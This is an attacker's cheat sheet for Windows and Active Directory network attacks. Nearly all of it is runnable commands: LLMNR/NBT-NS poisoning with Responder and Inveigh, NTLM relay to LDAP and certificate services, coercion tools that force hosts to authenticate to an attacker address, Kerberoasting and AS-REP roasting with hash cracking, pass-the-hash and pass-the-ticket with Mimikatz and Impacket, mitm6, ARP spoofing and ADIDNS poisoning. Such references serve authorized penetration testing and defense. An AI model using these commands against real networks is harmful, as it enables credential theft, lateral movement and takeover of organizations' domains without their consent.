# Windows Network Attacks

Network-level attacks for Windows environments and Active Directory.

---

## 1. LLMNR / NBT-NS / mDNS Poisoning

```bash
# Responder (attacker — Linux)
sudo responder -I eth0 -dwPv

# Inveigh (attacker — PowerShell, run from compromised Windows host)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -SMB Y

# Inveigh (C# version)
.\InveighZero.exe

# Capture NTLMv2 hashes, then crack:
hashcat -m 5600 captured_hash.txt wordlist.txt
```

---

## 2. NTLM Relay

```bash
# ntlmrelayx (Impacket)
# Relay captured NTLM auth to another target
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (for AD escalation)
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user attacker

# Relay to ADCS (ESC8 — web enrollment)
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

# Trigger authentication (force target to auth to you)
# PetitPotam
python3 PetitPotam.py attacker_ip target_ip

# PrinterBug / SpoolSample
python3 printerbug.py domain/user:password@target attacker_ip

# Coerce via DFSCoerce
python3 DFSCoerce.py -u user -p password -d domain -dc-ip dc_ip attacker_ip
```

---

## 3. SMB Attacks

```bash
# SMB relay (Responder + ntlmrelayx)
# 1. Disable Responder SMB/HTTP servers in Responder.conf
# 2. Run Responder for poisoning only
sudo responder -I eth0 -dwPv
# 3. Run ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -i  # Interactive shell

# smbclient access
smbclient -L //target -U user%password
smbclient //target/share -U user%password

# CrackMapExec / NetExec
crackmapexec smb targets.txt -u user -p password --shares
crackmapexec smb targets.txt -u user -H ntlm_hash --shares
```

---

## 4. Kerberoasting

```bash
# From Linux (Impacket)
GetUserSPNs.py domain.local/user:password -dc-ip dc_ip -request

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# From Windows (PowerView)
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Crack
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## 5. AS-REP Roasting

```bash
# From Linux
GetNPUsers.py domain.local/ -dc-ip dc_ip -usersfile users.txt -no-pass -outputfile asrep.txt

# From Windows (Rubeus)
.\Rubeus.exe asreproast /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 6. Pass-the-Hash

```bash
# Impacket psexec
psexec.py -hashes :ntlm_hash domain/user@target

# Impacket wmiexec
wmiexec.py -hashes :ntlm_hash domain/user@target

# CrackMapExec
crackmapexec smb target -u user -H ntlm_hash -x "whoami"

# Evil-WinRM
evil-winrm -i target -u user -H ntlm_hash

# Mimikatz
sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe
```

---

## 7. Pass-the-Ticket

```bash
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi

# From Linux (Impacket)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain/user@target
```

---

## 8. IPv6 Attacks (mitm6)

```bash
# mitm6 — DHCP6 poisoning + WPAD + NTLM relay
sudo mitm6 -d domain.local

# Combined with ntlmrelayx for delegation
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh wpad.domain.local --delegate-access

# Creates machine account with delegation rights
```

---

## 9. ARP Spoofing

```bash
# bettercap
sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets target_ip
> arp.spoof on
> net.sniff on

# arpspoof (dsniff)
sudo arpspoof -i eth0 -t target_ip gateway_ip
sudo arpspoof -i eth0 -t gateway_ip target_ip
# Enable forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## 10. ADIDNS Poisoning

```bash
# Add DNS record in AD-integrated DNS (any domain user)
# Requires: dnstool.py or PowerMad
python3 dnstool.py -u domain\\user -p password -a add -r attacker -d attacker_ip dc_ip

# PowerMad
Import-Module .\Powermad.ps1
New-ADIDNSNode -Node attacker -Data attacker_ip
```
